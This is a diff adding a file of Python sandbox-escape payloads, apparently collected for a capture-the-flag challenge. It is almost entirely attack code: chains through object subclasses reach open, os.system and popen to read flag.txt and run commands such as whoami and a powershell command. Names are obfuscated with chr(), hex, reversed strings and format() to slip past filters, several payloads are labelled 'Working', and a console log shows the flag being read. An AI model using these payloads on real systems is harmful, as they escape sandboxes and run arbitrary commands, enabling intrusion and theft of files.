@@ -1,0 +1,106 @@
+
+
+
+().__class__.__bases__[0].__subclasses__()[142].__init__.__globals__['__builtins__']['open'](chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()
+
+print(().__class__.__bases__[0].__subclasses__()[142].__init__.__globals__['__builtins__']['open'](chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read())
+
+().__class__.__bases__[0].__subclasses__()[142].__init__.__globals__['\x73\x79\x73\x74\x65\x6d']('whoami')
+
+
+Hex encoding: \x6f\x70\x65\x6e for "open"
+Base64 decode
+String concatenation: 'op' + 'en'
+Using chr() and ord()
+Reverse strings: 'nepo'[::-1]```
+
+().__class__.__bases__[0].__subclasses__()[142].__init__.__globals__['\x6f\x70\x65\x6e']('flag.txt').read()
+
+
+().__class__.__bases__[0].__subclasses__()[142].__init__.__globals__.__getitem__('syst'+'em')('whoami')
+().__class__.__bases__[0].__subclasses__()[142].__init__.__globals__['\x73\x79\x73\x74\x65\x6d']('whoami')
+
+().__class__.__bases__[0].__subclasses__()[122]('flag', 'flag.txt').get_data('flag.txt')
+
+().__class__.__bases__[0].__subclasses__()[122].get_data(".", "flag.txt")
+
+().__class__.__mro__[1].__subclasses__()[356](["type","flag.txt"], stdout=-1).communicate()[0]
+
+ ().__class__.__mro__[1].__subclasses__()[122](chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116),
+  '.').get_data(chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116))
+
+
+  Method 1: chr() encoding
+
+  obj = ().__class__.__bases__[0].__subclasses__()[122](".", "flag.txt"); method = chr(103)+chr(101)+chr(116)+chr(95)+chr(100)+chr(97)+chr(116)+chr(97);
+  print(obj.__getattribute__(method)("flag.txt"))
+
+  Method 2: Hex encoding
+
+  obj = ().__class__.__bases__[0].__subclasses__()[122](".", "flag.txt"); method = b'\x67\x65\x74\x5f\x64\x61\x74\x61'.decode();print(obj.__getattribute__(method)("flag.txt"))
+
+  Method 3: String reversal
+
+  obj = ().__class__.__bases__[0].__subclasses__()[122](".", "flag.txt"); method = 'atad_teg'[::-1]; print(obj.__getattribute__(method)("flag.txt"))
+
+  Method 4: Dynamic class discovery + chr() obfuscation
+
+  loader = [x for x in ().__class__.__bases__[0].__subclasses__() if 'FileLoader' in str(x)][0]; obj = loader(".", "flag.txt"); method =
+  chr(103)+chr(101)+chr(116)+chr(95)+chr(100)+chr(97)+chr(116)+chr(97); print(obj.__getattribute__(method)("flag.txt"))
+
+  Method 5: format() encoding (if format available)
+
+  obj = ().__class__.__bases__[0].__subclasses__()[122](".", "flag.txt"); method =
+  format(103,'c')+format(101,'c')+format(116,'c')+format(95,'c')+format(100,'c')+format(97,'c')+format(116,'c')+format(97,'c');
+  print(obj.__getattribute__(method)("flag.txt"))
+
+  Method 6: Multiple obfuscation layers
+
+  filename = chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116); obj = ().__class__.__bases__[0].__subclasses__()[122](".", filename);
+  method = 'atad_teg'[::-1]; print(obj.__getattribute__(method)(filename))
+
+
+
+
+  File Reading Payloads (Working):
+
+[x for x in ().__class__.__bases__[0].__subclasses__() if 'FileLoader' in str(x)][0]('flag.txt', '.').get_data('flag.txt')
+
+  1. FileLoader with dynamic discovery:
+  print([x for x in ().__class__.__bases__[0].__subclasses__() if 'FileLoader' in str(x)][0]('flag.txt','.').get_data('flag.txt'))
+
+  2. FileLoader with string obfuscation:
+  fl = chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116);print([x for x in ().__class__.__bases__[0].__subclasses__() if 'FileLoader' in str(x)][0](fl, '.').get_data(fl))
+
+  3. Other file loader classes:
+  # SourceFileLoader
+  [x for x in ().__class__.__bases__[0].__subclasses__() if 'SourceFileLoader' in str(x)][0]('flag','flag.txt').get_data('flag.txt')
+
+  # ExtensionFileLoader
+  [x for x in ().__class__.__bases__[0].__subclasses__() if 'ExtensionFileLoader' in str(x)][0]('flag','flag.txt').get_data('flag.txt')
+
+
+
+
+
+>>> a = [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__.keys()
+>>> a.sort()
+
+1 >>> print(().__class__.__bases__[0].__subclasses__()[122]('flag', 'flag.txt').get_data('flag.txt'))
+b'BCTF{0x5n34ky_py7h0n_35c4p3}'
+2 >>> print([x for x in ().__class__.__bases__[0].__subclasses__() if 'FileLoader' in str(x)][0]('flag.txt', '.').get_data('flag.txt'))
+b'BCTF{0x5n34ky_py7h0n_35c4p3}'
+3 >>> ().__class__.__bases__[0].__subclasses__()[153]()._module.__builtins__[chr(95)*2+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)*2](chr(111)+chr(115)).__dict__[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)]('whoami')
+BCTF{0x5n34ky_py7h0n_35c4p3}
+4 >>> ().__class__.__bases__[0].__subclasses__()[153]()._module.__builtins__[chr(95)*2+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)*2](chr(111)+chr(115)).__dict__[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)]('whoami')
+5 >>> ().__class__.__bases__[0].__subclasses__()[153]()._module.__builtins__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(111)+chr(115)).__getattribute__(chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))(chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116))
+6 >>> ().__class__.__bases__[0].__subclasses__()[153]()._module.__builtins__['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73').__getattribute__('\x73\x79\x73\x74\x65\x6d')('whoami')
+7. >>> ().__class__.__bases__[0].__subclasses__()[153]()._module.__builtins__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(111)+chr(115)).__getattribute__(chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))(chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116))
+8. >>> ().__class__.__bases__[0].__subclasses__()[153]()._module.__builtins__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(111)+chr(115)).__getattribute__('metsys'[::-1])('whoami')
+9. >>> c=().__class__.__bases__[0].__subclasses__()[153]();o=c._module.__builtins__['nepo'[::-1]];t=o('galf'[::-1]+'.'+'txt');r=t.read();print(r)
+
+10. ().__class__.__bases__[0].__subclasses__()[153]()._module.__builtins__[chr(95)*2+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)*2](chr(111)+chr(115)).__getattribute__(chr(112)+chr(111)+chr(112)+chr(101)+chr(110))(chr(116)+chr(121)+chr(112)+chr(101)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()
+
+().__class__.__bases__[0].__subclasses__()[153]()._module.__builtins__[chr(95)*2+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)*2](chr(111)+chr(115)).__getattribute__(chr(112)+chr(111)+chr(112)+chr(101)+chr(110))(chr(112)+chr(111)+chr(119)+chr(101)+chr(114)+chr(115)+chr(104)+chr(101)+chr(108)+chr(108)+chr(32)+chr(45)+chr(99)+chr(32)+chr(71)+chr(101)+chr(116)+chr(45)+chr(67)+chr(111)+chr(110)+chr(116)+chr(101)+chr(110)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()
+
+print(().__class__.__bases__[0].__subclasses__()[156].__init__.__getattribute__(chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)][chr(111)+chr(112)+chr(101)+chr(110)](chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()
